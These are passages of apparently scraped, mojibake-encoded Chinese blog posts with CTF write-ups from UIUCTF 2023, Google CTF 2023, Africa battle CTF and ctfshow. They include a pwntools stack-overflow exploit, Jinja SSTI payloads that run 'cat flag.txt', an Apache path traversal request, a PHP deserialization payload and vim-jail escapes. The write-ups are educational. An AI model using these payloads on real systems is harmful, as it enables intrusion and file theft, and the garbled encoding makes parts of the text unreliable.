:eè¡¨ç¤ºç¼–è¾‘ä¸€ä¸ªæ–‡ä»¶ vimjail2123456#entry.sh#!/usr/bin/env shvim -R -M -Z -u /home/user/vimrc -i /home/user/viminfocat /flag.txt ä»¥åªè¯»æ¨¡å¼ã€æ–‡æœ¬ä¸å¯ä¿®æ”¹ã€é™åˆ¶æ¨¡å¼å¯åŠ¨vimï¼Œæ›¿æ¢äº†åŸæœ‰çš„vimrcå’Œviminfo 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#vimrcset nocompatibleset insertmodeinoremap &lt;c-o&gt; nopeinoremap &lt;c-l&gt; nopeinoremap &lt;c-z&gt; nopeinoremap &lt;c-\\&gt;&lt;c-n&gt; nopecnoremap a _cnoremap b _cnoremap c _cnoremap d _cnoremap e _cnoremap f _cnoremap g _cnoremap h _cnoremap i _cnoremap j _cnoremap k _cnoremap l _cnoremap m _cnoremap n _cnoremap o _cnoremap p _cnoremap r _cnoremap s _cnoremap t _cnoremap u _cnoremap v _cnoremap w _cnoremap x _cnoremap y _cnoremap z _cnoremap ! _cnoremap @ _cnoremap # _cnoremap $ _cnoremap % _cnoremap ^ _cnoremap &amp; _cnoremap * _cnoremap - _cnoremap + _cnoremap = _cnoremap ` _cnoremap ~ _cnoremap &#123; _cnoremap &#125; _cnoremap [ _cnoremap ] _cnoremap \\| _cnoremap \\ _cnoremap ; _cnoremap &lt; _cnoremap &gt; _cnoremap , _cnoremap . _cnoremap / _cnoremap ? _ å°†æ‰€æœ‰å­—ç¬¦éƒ½è½¬æ¢æˆäº†ä¸‹åˆ’çº¿ï¼Œç»•è¿‡æ–¹å¼è¿˜æ˜¯ä¸¤æ¬¡ctrl+\\+ctrl+nï¼Œentry.shä¸­æœ€åæœ‰ä¸€ä¸ªcat /flag,è¿™æ„å‘³ç€é€€å‡ºvimåä¼šæ‰“å°å‡ºflag. :qå³å¯ã€‚ Corny Kernelé™„ä»¶ç»™äº†ä¸€ä¸ªcæ–‡ä»¶ 12345678910111213141516171819202122232425262728// SPDX-License-Identifier: GPL-2.0-only#define pr_fmt(fmt) KBUILD_MODNAME &quot;: &quot; fmt#include &lt;linux/module.h&gt;#include &lt;linux/init.h&gt;#include &lt;linux/kernel.h&gt;extern const char *flag1, *flag2;static int __init pwny_init(void)&#123; pr_alert(&quot;%s\\n&quot;, flag1); return 0;&#125;static void __exit pwny_exit(void)&#123; pr_info(&quot;%s\\n&quot;, flag2);&#125;module_init(pwny_init);module_exit(pwny_exit);MODULE_AUTHOR(&quot;Nitya&quot;);MODULE_DESCRIPTION(&quot;UIUCTF23&quot;);MODULE_LICENSE(&quot;GPL&quot;);MODULE_VERSION(&quot;0.1&quot;); ä¸‹é¢çš„ä»£ç çš„æ„æ€æ˜¯å½“åŠ è½½æ¨¡å—çš„æ—¶å€™è¾“å‡ºç¬¬ä¸€æ®µflag 123456789static int __init pwny_init(void)&#123; pr_alert(&quot;%s\\n&quot;, flag1); return 0;&#125;...module_init(pwny_init); #è¿™è¡Œä»£ç å°† pwny_init å‡½æ•°æ³¨å†Œä¸ºæ¨¡å—çš„åˆå§‹åŒ–å‡½æ•°ã€‚åœ¨æ¨¡å—åŠ è½½æ—¶ï¼Œè¯¥å‡½æ•°å°†è¢«è°ƒç”¨ã€‚ é¦–å…ˆç”¨gzip -d pwnymodule.ko.gzï¼Œç„¶åç”¨insmod pwnymodule.koåŠ è½½è¿™ä¸ªæ¨¡å—ï¼ŒåŠ è½½å®Œæˆåä¼šè¾“å‡ºç¬¬ä¸€ä¸²flagã€‚ 123456static void __exit pwny_exit(void)&#123; pr_info(&quot;%s\\n&quot;, flag2);&#125;module_exit(pwny_exit); #è¿™è¡Œä»£ç å°† pwny_exit å‡½æ•°æ³¨å†Œä¸ºæ¨¡å—çš„é€€å‡ºå‡½æ•°ã€‚åœ¨æ¨¡å—è¢«å¸è½½æ—¶ï¼Œè¯¥å‡½æ•°å°†è¢«è°ƒç”¨æ¥æ‰§è¡Œæ¸…ç†æ“ä½œã€‚ è¿™ä¸€ä¸²ä»£ç çš„æ„æ€æ˜¯è¿™ä¸ªæ¨¡å—åœ¨è¢«å¸è½½çš„æ—¶å€™è¾“å‡ºç¬¬äºŒæ®µflag,ç”¨rmmod pwnymodule.koè¿™ä¸ªå¸è½½æ¨¡å—,ç„¶åç”¨dmesgè¾“å‡ºå†…æ ¸çš„ä¿¡æ¯ï¼Œåœ¨æœ€åä¼šè¾“å‡ºä¸¤æ®µflagã€‚ vimjail1.512345#entry.sh#!/usr/bin/env shvim -R -M -Z -u /home/user/vimrc 12345678#vimrcset nocompatibleset insertmodeinoremap &lt;c-o&gt; nopeinoremap &lt;c-l&gt; nopeinoremap &lt;c-z&gt; nopeinoremap &lt;c-\\&gt; nope åˆ«çš„æ²¡å˜ï¼Œä½†æ˜¯ä¹‹å‰çš„æ–¹æ³•æ²¡ç”¨äº†ï¼Œç”¨ctrl+rè¿™ä¸ªç”¨äºæ‰§è¡Œæ’¤é”€å’Œé‡åšæ“ä½œã€‚ç„¶åç”¨=execute(readfile(&#39;flag.txt&#39;)) = æ˜¯ç”¨äºæ‰§è¡Œè¡¨è¾¾å¼çš„å‘½ä»¤ã€‚execute()ï¼šexecute() å‡½æ•°ç”¨äºæ‰§è¡Œ Vim å‘½ä»¤ã€‚readfile(&#39;flag.txt&#39;)ï¼šä½¿ç”¨ Vim çš„å†…ç½®å‡½æ•° readfile() è¯»å–åä¸º flag.txt çš„æ–‡ä»¶å†…å®¹ï¼Œå¹¶è¿”å›ä¸€ä¸ªåŒ…å«æ–‡ä»¶å†…å®¹çš„åˆ—è¡¨ã€‚å°±æ˜¯å°†flag.txté‡Œé¢çš„å†…å®¹å˜æˆå‘½ä»¤æ‰§è¡Œ,ç„¶åå°±ä¼šæŠ¥é”™ æˆ–è€…ï¼Œç”¨=execute(&#39;:e flag.txt&#39;)ç„¶åæŒ‰ä¸¤æ¬¡å›è½¦ã€‚ vimjail2.512345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#vimrcset nocompatibleset insertmodeinoremap &lt;c-o&gt; nopeinoremap &lt;c-l&gt; nopeinoremap &lt;c-z&gt; nopeinoremap &lt;c-\\&gt; nopecnoremap a _cnoremap b _cnoremap c _cnoremap d _cnoremap e _cnoremap f _cnoremap g _cnoremap h _cnoremap i _cnoremap j _cnoremap k _cnoremap l _cnoremap m _cnoremap n _cnoremap o _cnoremap p _cnoremap r _cnoremap s _cnoremap t _cnoremap u _cnoremap v _cnoremap w _cnoremap x _cnoremap y _cnoremap z _cnoremap ! _cnoremap @ _cnoremap # _cnoremap $ _cnoremap % _cnoremap ^ _cnoremap &amp; _cnoremap * _cnoremap - _cnoremap + _cnoremap = _cnoremap ` _cnoremap ~ _cnoremap &#123; _cnoremap &#125; _cnoremap [ _cnoremap ] _cnoremap \\| _cnoremap \\ _cnoremap ; _cnoremap &lt; _cnoremap &gt; _cnoremap , _cnoremap . _cnoremap / _cnoremap ? _ è¿™ä¸ªåªèƒ½è¾“å…¥:qï¼Œæ–¹æ³•åŸºæœ¬ä¸Šå·®ä¸å¤šï¼Œè¿˜æ˜¯ctrl+rç„¶å=,æŒ‰TABé”®å¯ä»¥è¡¥å…¨å†…ç½®ä»£ç ï¼Œç„¶åæ‰¾åˆ°executeï¼Œæœ€åçš„å‘½ä»¤æ˜¯execute(&quot;:q&quot;)ï¼Œåä¼šè¾“å‡ºflagã€‚ cryptoThree-Time Padhttp://dann.com.br/alexctf2k17-crypto100-many_time_secrets/ çœ‹è¿™ç¯‡åšå®¢ï¼Œç”¨ä»–çš„è„šæœ¬å¯ä»¥è§£å‡ºè¿™é“é¢˜ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778#!/usr/bin/python## OTP - Recovering the private key from a set of messages that were encrypted w/ the same private key (Many time pad attack) - crypto100-many_time_secret @ alexctf 2017# @author intrd - http://dann.com.br/ # Original code by jwomers: https://github.com/Jwomers/many-time-pad-attack/blob/master/attack.py)import stringimport collectionsimport sets, sys# 11 unknown ciphertexts (in hex format), all encrpyted with the same keyc1 = &quot;14f5f95b4a252948a8aef177d6c92d82e3016362bd7463f41f40a00ad9e0ccad911b959ef8dfad5f1cc4481ecb64&quot;c2 = &quot;06e2f65a4c256d0ba8ada164cecd329cae436069f83476e91757e91bd4a4cce2c60a8f9aac8cb14210d55253cd787c0f6a&quot;c3 = &quot;03f9ea574c267249b2b1ef5d91cd3c99904a3f75873871e94157df0fcbb5d1eab94f9386&quot;ciphers = [c1, c2, c3]# The target ciphertext we want to cracktarget_cipher = &quot;03f9ea574c267249b2b1ef5d91cd3c99904a3f75873871e94157df0fcbb5d1eab94f9386&quot;# XORs two stringdef strxor(a, b): # xor two strings (trims the longer input) return &quot;&quot;.join([chr(ord(x) ^ ord(y)) for (x, y) in zip(a, b)])# To store the final keyfinal_key = [None]*150# To store the positions we know are brokenknown_key_positions = set()# For each ciphertextfor current_index, ciphertext in enumerate(ciphers): counter = collections.Counter() # for each other ciphertext for index, ciphertext2 in enumerate(ciphers): if current_index != index: # don&#x27;t xor a ciphertext with itself for indexOfChar, char in enumerate(strxor(ciphertext.decode(&#x27;hex&#x27;), ciphertext2.decode(&#x27;hex&#x27;))): # Xor the two ciphertexts # If a character in the xored result is a alphanumeric character, it means there was probably a space character in one of the plaintexts (we don&#x27;t know which one) if char in string.printable and char.isalpha(): counter[indexOfChar] += 1 # Increment the counter at this index knownSpaceIndexes = [] # Loop through all positions where a space character was possible in the current_index cipher for ind, val in counter.items(): # If a space was found at least 7 times at this index out of the 9 possible XORS, then the space character was likely from the current_index cipher! if val &gt;= 7: knownSpaceIndexes.append(ind) #print knownSpaceIndexes # Shows all the positions where we now know the key! # Now Xor the current_index with spaces, and at the knownSpaceIndexes positions we get the key back! xor_with_spaces = strxor(ciphertext.decode(&#x27;hex&#x27;),&#x27; &#x27;*150) for index in knownSpaceIndexes: # Store the key&#x27;s value at the correct position final_key[index] = xor_with_spaces[index].encode(&#x27;hex&#x27;) # Record that we known the key at this position known_key_positions.add(index)# Construct a hex key from the currently known key, adding in &#x27;00&#x27; hex chars where we do not know (to make a complete hex string)final_key_hex = &#x27;&#x27;.join([val if val is not None else &#x27;00&#x27; for val in final_key])# Xor the currently known key with the target cipheroutput = strxor(target_cipher.decode(&#x27;hex&#x27;),final_key_hex.decode(&#x27;hex&#x27;))print &quot;Fix this sentence:&quot;print &#x27;&#x27;.join([char if index in known_key_positions else &#x27;*&#x27; for index, char in enumerate(output)])+&quot;\\n&quot;# WAIT.. MANUAL STEP HERE # This output are printing a * if that character is not known yet# fix the missing characters like this: &quot;Let*M**k*ow if *o&#123;*a&quot; = &quot;cure, Let Me know if you a&quot;# if is too hard, change the target_cipher to another one and try again# and we have our key to fix the entire text!#sys.exit(0) #comment and continue if u got a good keytarget_plaintext = &quot;printed on flammable material so that spies could&quot;print &quot;Fixed:&quot;print target_plaintext+&quot;\\n&quot;key = strxor(target_cipher.decode(&#x27;hex&#x27;),target_plaintext)print &quot;Decrypted msg:&quot;for cipher in ciphers: print strxor(cipher.decode(&#x27;hex&#x27;),key)print &quot;\\nPrivate key recovered: &quot;+key+&quot;\\n&quot; è¿è¡Œå¾—åˆ°flag At Home12345678910111213141516171819202122#chal.pyfrom Crypto.Util.number import getRandomNBitIntegerflag = int.from_bytes(b&quot;uiuctf&#123;******************&#125;&quot;, &quot;big&quot;)a = getRandomNBitInteger(256)b = getRandomNBitInteger(256)a_ = getRandomNBitInteger(256)b_ = getRandomNBitInteger(256)M = a * b - 1e = a_ * M + ad = b_ * M + bn = (e * d - 1) // Mc = (flag * e) % nprint(f&quot;&#123;e = &#125;&quot;)print(f&quot;&#123;n = &#125;&quot;)print(f&quot;&#123;c = &#125;&quot;) 123e = 359050389152821553416139581503505347057925208560451864426634100333116560422313639260283981496824920089789497818520105189684311823250795520058111763310428202654439351922361722731557743640799254622423104811120692862884666323623693713n = 26866112476805004406608209986673337296216833710860089901238432952384811714684404001885354052039112340209557226256650661186843726925958125334974412111471244462419577294051744141817411512295364953687829707132828973068538495834511391553765427956458757286710053986810998890293154443240352924460801124219510584689c = 67743374462448582107440168513687520434594529331821740737396116407928111043815084665002104196754020530469360539253323738935708414363005373458782041955450278954348306401542374309788938720659206881893349940765268153223129964864641817170395527170138553388816095842842667443210645457879043383345869 é€šè¿‡c=(flag*e)%nå¯å¾— 123c = (flag * e) % nc * e^-1 = (flag * e * e^-1) % nc * e^-1 = flag % n 1234567from Crypto.Util.number import *e = 359050389152821553416139581503505347057925208560451864426634100333116560422313639260283981496824920089789497818520105189684311823250795520058111763310428202654439351922361722731557743640799254622423104811120692862884666323623693713n = 26866112476805004406608209986673337296216833710860089901238432952384811714684404001885354052039112340209557226256650661186843726925958125334974412111471244462419577294051744141817411512295364953687829707132828973068538495834511391553765427956458757286710053986810998890293154443240352924460801124219510584689c = 67743374462448582107440168513687520434594529331821740737396116407928111043815084665002104196754020530469360539253323738935708414363005373458782041955450278954348306401542374309788938720659206881893349940765268153223129964864641817170395527170138553388816095842842667443210645457879043383345869d=inverse(e,n)flag=(c*d)%nprint(long_to_bytes(flag)) PWNChainmailä¸€ä¸ªåŸºç¡€çš„æ ˆæº¢å‡ºï¼Œè·³åˆ°give_flagçš„å‡½æ•°å³å¯ï¼Œä½†è¦æ³¨æ„çš„æ˜¯åœ¨å‘é€give_flagçš„åœ°å€ä¹‹å‰è¦å†ç»™ä»–å‘é€ä¸€ä¸ªretçš„åœ°å€ï¼Œå¦åˆ™ä¼šé€ æˆé”™è¯¯çš„å¯¹é½ã€‚retçš„åœ°å€å¯ä»¥ç”¨ROPgadget æ‰¾ï¼Œå‘½ä»¤:ROPgadget --binary chal --only &#39;ret&#39;ã€‚ expï¼š 12345from pwn import *a = remote(&quot;chainmail.chal.uiuc.tf&quot;, 1337)payload=b&#x27;a&#x27;*72 +p64(0x40101a) + p64(0x401216)a.sendline(payload)a.interactive() WEBpeanut-xssXSSå­¦çš„ä¸æ˜¯å¾ˆå¥½ï¼Œå…·ä½“æ€ä¹ˆè§£å¯ä»¥çœ‹ä¸‹é¢çš„æ–‡ç« : https://hackmd.io/@Solderet/UIUCTF-2023-peanut-xss","categories":[{"name":"ctf","slug":"ctf","permalink":"https://lvzhouhang.xyz/categories/ctf/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://lvzhouhang.xyz/tags/ctf/"}]},{"title":"Google-CTF2023","slug":"Google-CTF2023","date":"2023-06-29T10:32:01.000Z","updated":"2025-04-19T13:25:36.810Z","comments":true,"path":"2023/06/29/Google-CTF2023/","permalink":"https://lvzhouhang.xyz/2023/06/29/Google-CTF2023/","excerpt":"","text":"MISCPAPAPAPAä¸‹è½½ä¸‹æ¥é™„ä»¶æ˜¯ä¸€å¼ å…¨ç™½çš„å›¾ç‰‡ï¼Œé€šè¿‡ä¿®æ”¹jpgçš„å®½é«˜è·å¾—flag ä»FFåˆ°01ä¸­é—´ï¼Œä¿®æ”¹æˆFF C0 00 11 08 02 00 02 10 03 01 31 00 02 31 01 03 31 01 å³è¾¹å°±æ˜¯flag WEBUNDER-CONSTRUCTIONç»™äº†ä¸€ä¸ªflaskå’Œä¸€ä¸ªphpçš„æœåŠ¡ï¼Œæ²¡æœ‰åŠæ³•sstiæ³¨å…¥ 123456789101112131415161718192021222324252627function getResponse()&#123; if (!isset($_POST[&#x27;username&#x27;]) || !isset($_POST[&#x27;password&#x27;])) &#123; return NULL; &#125; $username = $_POST[&#x27;username&#x27;]; $password = $_POST[&#x27;password&#x27;]; if (!is_string($username) || !is_string($password)) &#123; return &quot;Please provide username and password as string&quot;; &#125; $tier = getUserTier($username, $password); if ($tier === NULL) &#123; return &quot;Invalid credentials&quot;; &#125; $response = &quot;Login successful. Welcome &quot; . htmlspecialchars($username) . &quot;.&quot;; if ($tier === &quot;gold&quot;) &#123; $response .= &quot; &quot; . getenv(&quot;FLAG&quot;); &#125; return $response;&#125; é€šè¿‡ä»£ç åˆ†æï¼Œåœ¨phpçš„æœåŠ¡ä¸Šï¼Œåªè¦è®©tier=goldå°±è¾“å‡ºflagã€‚ å¯ä»¥åœ¨æ³¨å†Œè´¦å·çš„æ—¶å€™ä¼ ä¸¤ä¸ªtierã€‚ flaskè¯†åˆ«ç¬¬ä¸€ä¸ªtierï¼Œphpè¯†åˆ«ç¬¬äºŒä¸ªtierï¼Œæ³¨å†Œå®Œååœ¨phpæœåŠ¡ç™»å½•å¾—åˆ°falgã€‚ å…¶ä»–çš„å¤ªéš¾äº†ï¼Œçœ‹éƒ½çœ‹ä¸æ‡‚ http://blog.xmcve.com/2023/06/26/Google-CTF-2023-Writeup/ å¯ä»¥çœ‹è¿™ä¸ª","categories":[{"name":"ctf","slug":"ctf","permalink":"https://lvzhouhang.xyz/categories/ctf/"},{"name":"å¤ç›˜","slug":"ctf/å¤ç›˜","permalink":"https://lvzhouhang.xyz/categories/ctf/%E5%A4%8D%E7%9B%98/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://lvzhouhang.xyz/tags/ctf/"}]},{"title":"Africa battle CTF","slug":"Africa-battle-CTF","date":"2023-06-26T00:29:04.000Z","updated":"2025-04-19T13:25:36.810Z","comments":true,"path":"2023/06/26/Africa-battle-CTF/","permalink":"https://lvzhouhang.xyz/2023/06/26/Africa-battle-CTF/","excerpt":"","text":"WEBCivilization1234567891011121314&lt;?phprequire(&quot;./flag.php&quot;);if(isset($_GET[&#x27;source&#x27;]))&#123; highlight_file(__FILE__); &#125;if(isset($_GET[&#x27;ami&#x27;]))&#123; $input = $_GET[&#x27;ami&#x27;]; $cigar = &#x27;africacradlecivilization&#x27;; if (preg_replace(&quot;/$cigar/&quot;,&#x27;&#x27;,$input) === $cigar) &#123; africa(); &#125;&#125;include(&quot;home.html&quot;);?&gt; ?sourceå¾—åˆ°è¿™ä¸ªï¼Œè¿™ä¸ªåªç”¨åŒå†™å°±å¯ä»¥ç»•è¿‡ã€‚ payload: 1?ami=africacradlecafricacradlecivilizationivilization Cobalt Injectionåœ¨æºä»£ç é‡Œæœ‰ &lt;!-- IP?capital=Benin --&gt; å¯çŸ¥å­˜åœ¨sstiæ¨¡æ¿æ³¨å…¥ã€‚æ²¡æœ‰è¿‡æ»¤ã€‚ payload: 1?capital=&#123;&#123;%27%27.__class__.__base__.__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](&#x27;cat flag.txt&#x27;).read()&#125;&#125; å½“ç„¶çœ‹åˆ«äººçš„WPï¼Œè¦é•¿è„‘å­äº† 1?capital=&#123;&#123;request.application.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;cat flag.txt&#x27;).read()&#125;&#125; #request.applicationï¼šè¡¨ç¤ºå½“å‰è¯·æ±‚çš„åº”ç”¨ç¨‹åºå¯¹è±¡ã€‚ 1?capital=&#123;&#123;().__class__.__base__.__subclasses__()[354](&#x27;cat flag.txt&#x27;, shell=True, stdout=-1).communicate()[0].strip()&#125;&#125; è¿™ä¸ªè¿˜æ²¡ææ˜ç™½ï¼Œææ˜ç™½äº†å†å›æ¥ä¿®æ”¹ã€‚ FÃ¢è®¿é—®?source 1234567891011121314151617181920212223242526272829&lt;?php include(&quot;flag.php&quot;); if(isset($_GET[&#x27;source&#x27;]))&#123; highlight_file(__FILE__); &#125; class africa &#123; var $boknn; var $du; &#125; if (isset($_GET[&#x27;fa&#x27;])) &#123; $vodoo = $_GET[&#x27;fa&#x27;]; $fa = unserialize($vodoo); if ($fa) &#123; $fa-&gt;du=$flag; if ($fa-&gt;du === $fa-&gt;boknn) echo &quot;Congratulation! You&#x27;ve got the best interpretation: &lt;b&gt;&quot;.$fa-&gt;du.&quot;&lt;/b&gt;&quot;; else echo &quot;Oh no...&quot;; &#125; else echo &quot;you dey smoke igbo?&quot;; &#125; include(&quot;home.html&quot;);?&gt; ååºåˆ—åŒ–ï¼Œåªè¦å°†ä¼ å…¥çš„faå€¼å’Œ$duç›¸ç­‰å°±å¯ä»¥è¾“å‡ºflagã€‚ payload: 1?fa=O:6:&quot;africa&quot;:2:&#123;s:5:&quot;boknn&quot;;N;s:2:&quot;du&quot;;R:2;&#125; å…¶ä¸­ï¼Œboknnçš„å€¼ä¸ºNULLï¼Œduçš„å€¼é€šè¿‡Rå¼•ç”¨äº†ç¼–å·ä¸º2çš„å€¼ï¼Œ boknnçš„ç¼–å·å°±ä¸º2ã€‚ å…·ä½“çš„å¯ä»¥çœ‹:https://wiki.wgpsec.org/knowledge/ctf/php-serialize.html Own realityçœŸæ˜¯è®©æˆ‘é•¿è§è¯†äº†ã€‚ é¦–å…ˆæ˜¯.gitæ³„éœ² ç”¨wgetå°†ç½‘ç«™ä¸‹è½½ä¸‹æ¥ `wget http://chall.battlectf.online:8082/.git/ -mirror ä½¿ç”¨ --mirror é€‰é¡¹ä½ å¯ä»¥ä¸‹è½½æ•´ä¸ªç«™ç‚¹ï¼ŒåŒ…æ‹¬å®ƒçš„ç›®å½•ç»“æ„ã€‚ ç„¶åç”¨git reflogæŸ¥çœ‹å†å²ç‰ˆæœ¬ï¼Œä¹‹åç”¨git cherry-pick â€˜ä½ æƒ³è¦æ¢å¤çš„â€™ ä¼šå‡ºæ¥ä¸€ä¸ªflag.txt,å°¾éƒ¨æœ‰ 1.__..._..__...._.___._...___._...__.__...__.._._._....__._._._..._...__..____.__._._._._.__.___..__._.__.__.___..__.____.___.___.__.___.._._____.__..._..__._.._.___._...___..__._._____..__..__..___.....__._...__.._._.__.._._.__...._..__._....___.._.__..._...__._....__..._..__.___.__.._._.__.._._..__.._..__..__..__..__...__._._.__...._..__..._..__..__.__..__..__..._..__.._...__...__.__...__.__...._..__.__..__..__...__..__..__.._...__.___._____._ äºŒè¿›åˆ¶è½¬æ¢ä¸ºå­—ç¬¦å°±æ˜¯flag It shock youå…ˆç”¨whatwebçœ‹ç½‘ç«™ï¼Œ å¯ä»¥çœ‹åˆ°apacheçš„ç‰ˆæœ¬ï¼Œå»ç½‘ä¸Šæ‰¾ç›¸å¯¹åº”çš„æ¼æ´èƒ½æ‰¾åˆ°ï¼Œç›®å½•ç©¿è¶Š POC: 1234567891011121314GET /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/flag.txt HTTP/1.1Host: chall.battlectf.online:8083User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateDNT: 1Connection: closeCookie: PHPSESSID=6ae53a7d294917d5fdac2db41c97b477Upgrade-Insecure-Requests: 1If-Modified-Since: Tue, 06 Jun 2023 14:53:49 GMTIf-None-Match: &quot;b6d-5fd772fd55940&quot; AfricaWarning: This site is only for africa people. åœ¨bpä¸­å°†User-Agentæ”¹ä¸ºafrica Warning: Go away! Attacker! This page is only for local client! ç”¨X-Forwarded-Forä¼ªé€ 127.0.0.1 Warning: I don&#39;t trust users who are not from battlectf.online ç”¨Refererç»•è¿‡å¾—åˆ°flagã€‚ CryptoBack To OriginåŸƒåŠè±¡å½¢æ–‡ https://girlstart.org/wp-content/uploads/2020/05/Decoding-Hieroglyphics.pdf å¯ä»¥å‚è€ƒä¸Šé¢çš„é“¾æ¥ Blindhttps://gchq.github.io/CyberChef/ é¦–å…ˆæ˜¯magicè§£ç ï¼Œç„¶å braille,è§£ç å¾—åˆ°flag ROCYOUfactordbå’Œyafuåˆ†è§£ä¸å‡ºæ¥ï¼Œçœ‹åˆ«äººçš„åšå®¢çŸ¥é“æœ‰ROCAæ¼æ´ï¼Œå¯ä»¥ä»å…¬é’¥ä¸­æå–ç§é’¥ å·¥å…·ï¼š https://gitlab.com/parfaittolefo23/astuces-et-write-up-ctf/-/blob/main/Tools/neca ä¸€å¼€å§‹è¿è¡Œè¦ç»™æƒé™ å¯ä»¥ç”¨åœ¨çº¿çš„rsaè§£å¯†å·¥å…·ï¼šhttps://www.dcode.fr/chiffre-rsa 12p=127801155916875524149457561567678575565270601000365665873572024750823913157383q=113917064871970833547038329106470040388258358281464605006613652518914797349747 gooseé¦–å…ˆç»™äº†5ä¸ªéšæœºæ•°ï¼Œç„¶åå°†falgçš„æ¯ä¸ªå­—ç¬¦é€šè¿‡res = (2*a*pow(ord(x),4)+b*pow(ord(x),3)+c*pow(ord(x),2)+d*ord(x)+e)è¿›è¡ŒåŠ å¯†ã€‚ flagçš„å‰å‡ ä¸ªå­—ç¬¦æ˜¯çŸ¥é“çš„ï¼Œå¯ä»¥åˆ—æ–¹ç¨‹ç»„è®¡ç®—ä¸€ä¸‹a,b,c,d,eçš„å€¼ 123456184473632*a+941192*b+9604*c+98*d+1*e=1245115057305148164177058562*a+912673*b+9409*c+97*d+1*e=1195140205147730541362127872*a+1560896*b+13456*c+116*d+1*e=2441940832124642988362127872*a+1560896*b+13456*c+116*d+1*e=2441940832124642988272097792*a+1259712*b+11664*c+108*d+1*e=1835524676869638124208120802*a+1030301*b+10201*c+101*d+1*e=1404473868033353193 è§£å¾—ï¼š 12345a=6709636436b=7748795321c=7386429784d=62359624e=5008041292 ç„¶åå†™ä»£ç çˆ†ç ´: 12345678910111213141516flag = &#x27;&#x27;a=6709636436b=7748795321c=7386429784d=62359624e=5008041292tab=[1245115057305148164, 1195140205147730541, 2441940832124642988, 2441940832124642988, 1835524676869638124, 1404473868033353193, 272777109172255911, 672752034376118188, 324890781330979572, 3086023531811583439, 475309634185807521, 1195140205147730541, 2441940832124642988, 1578661367846445708, 2358921859155462327, 1099718459319293547, 773945458916291731, 78288818574073053, 2441940832124642988, 1578661367846445708, 1099718459319293547, 343816904985468003, 1195140205147730541, 2527132076695959961, 2358921859155462327, 2358921859155462327, 1099718459319293547, 72109063929756364, 2796116718132693772, 72109063929756364, 2796116718132693772, 72109063929756364, 2796116718132693772, 3291439457645322417]def encrypt(x): return (2*a*pow(ord(x),4)+b*pow(ord(x),3)+c*pow(ord(x),2)+d*ord(x)+e)for val in tab: for i in range(32,126): if(encrypt(chr(i))==val): flag+=chr(i) print(flag) REseyiida64ä½æ‰“å¼€,flagåœ¨getshellé‡Œé¢ã€‚ welcome é‡ç‚¹å°±æ˜¯è¿™ä¸ªï¼Œ addå°±æ˜¯åŠ ï¼Œ xorå°±æ˜¯å¼‚æˆ–ã€‚ å¾ˆç®€å•çš„ä¸€ä¸ªè¡¨è¾¾å¼ã€‚ 12345678from Crypto.Util.number import *a = 0x522D1B20F6b = 0x1EE2EEEEc = a+bd = 0x0AA84AAAflag = c^dflag = long_to_bytes(flag)print(flag) Infinity æ‰¾åˆ°æ±‡ç¼–ä»£ç é‡Œæ‰€æœ‰çš„pushï¼Œç„¶åå°†å€¼è½¬æ¢ä¸€ä¸‹ 1234567891011from pwn import *a= [p64(0x5F4F7572), p64(0x6C654354), p64(0x467B4265), p64(0x796F6E64), p64(0x62617474), p64(0x47616C61), p64(0x7869657D)]for c in a: print(c) 1234567b&#x27;ruO_\\x00\\x00\\x00\\x00&#x27;b&#x27;TCel\\x00\\x00\\x00\\x00&#x27;b&#x27;eB&#123;F\\x00\\x00\\x00\\x00&#x27;b&#x27;dnoy\\x00\\x00\\x00\\x00&#x27;b&#x27;ttab\\x00\\x00\\x00\\x00&#x27;b&#x27;alaG\\x00\\x00\\x00\\x00&#x27;b&#x27;&#125;eix\\x00\\x00\\x00\\x00&#x27; ç„¶åå°†è¿™äº›åè½¬ä¸€ä¸‹åˆ æ‰å¤šä½™çš„ä¸œè¥¿ 1234567_OurleCTF&#123;BebattGalaxie&#125;yond æœ€åå°†è¿™äº›æ‹¼æ¥ä¸€ä¸‹ï¼ŒbattleCTF&#123;Beyond_OurGalaxie&#125; ã€‚ babyrevç”¨idaæ‰“å¼€ï¼ŒæŸ¥è¯¢å­—ç¬¦ä¸²èƒ½å‘ç°qpiiatRIU&#123;Pvqp_Ugt3_UDDS_Stn_d0D!_85864r1277qu8195pqqtp6540494pr46&#125;ï¼Œç„¶åå‡¯æ’’è§£å¯†å¾—åˆ°flag checkerå’Œä¸Šä¸€é¢˜åŸºæœ¬ä¸Šå·®ä¸å¤š gfyyqjHYK&#123;Flg4_d0z_i3d_xr0p3_1lg0?&#125;ç„¶åå‡¯æ’’è§£å¯†","categories":[{"name":"ctf","slug":"ctf","permalink":"https://lvzhouhang.xyz/categories/ctf/"},{"name":"å¤ç›˜","slug":"ctf/å¤ç›˜","permalink":"https://lvzhouhang.xyz/categories/ctf/%E5%A4%8D%E7%9B%98/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://lvzhouhang.xyz/tags/ctf/"}]},{"title":"ctfshow webå…¥é—¨126~150","slug":"ctfshow-webå…¥é—¨126","date":"2023-03-18T07:42:06.000Z","updated":"2025-04-19T13:25:36.810Z","comments":true,"path":"2023/03/18/ctfshow-webå…¥é—¨126/","permalink":"https://lvzhouhang.xyz/2023/03/18/ctfshow-web%E5%85%A5%E9%97%A8126/","excerpt":"","text":"web126ä¸web125å·®ä¸å¤š 12get: a=1+fl0g=flag_give_mepost: CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=parse_str($a[1]) web127ç»•è¿‡æ–¹å¼å’Œweb123ä¸€æ ·ã€‚payloadï¼š 1?ctf show=ilove36d web128è€ƒå¯Ÿç‚¹ï¼šgettextæ‹“å±•çš„ä½¿ç”¨åœ¨å¼€å¯è¯¥æ‹“å±•å _() ç­‰æ•ˆäº gettext()payload: 1?f1=_&amp;f2=get_defined_vars web129 